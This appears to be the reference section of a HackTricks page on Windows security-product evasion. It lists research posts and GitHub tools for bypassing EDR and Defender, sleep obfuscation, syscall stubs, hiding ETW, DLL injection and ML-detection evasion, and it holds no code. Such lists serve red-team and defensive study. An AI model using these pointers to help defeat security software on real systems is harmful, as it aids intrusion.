- [20] [Zero Salarium – Protected Process Light (PPL)로 EDR에 대응하기](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique으로 Windows Defender의 보호막 무력화](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink 명령 참조](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain 아래: RAT에서 Builder, Coder까지](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer가 찾아옵니다: 새롭고 야심 찬 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption 복호화](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API tracing으로 Node.js malware 무력화](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace로 Adaptix를 재우기](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET 및 Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW 숨기기](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team 작전에서 Chrome Remote Desktop 악용하기: 실전 가이드](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender의 Remediation Driver를 Kernel Operation Primitive로 무기화하기](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo 동반 코드](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM으로 자체 마스킹 함수 만들기](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole 소스 코드](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe 함수](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - 리디렉션된 입력 및 출력으로 자식 프로세스 만들기](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge로 C# 도구 되살리기](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET 프로젝트 컴파일하기](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept 및 소스 코드](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcodeless DLL injection을 위한 thread pool 내부 기능 악용](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark 데이터셋 및 thrember 도구](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024를 사용한 red team implant 평가](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning 기반 탐지 회피하기](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
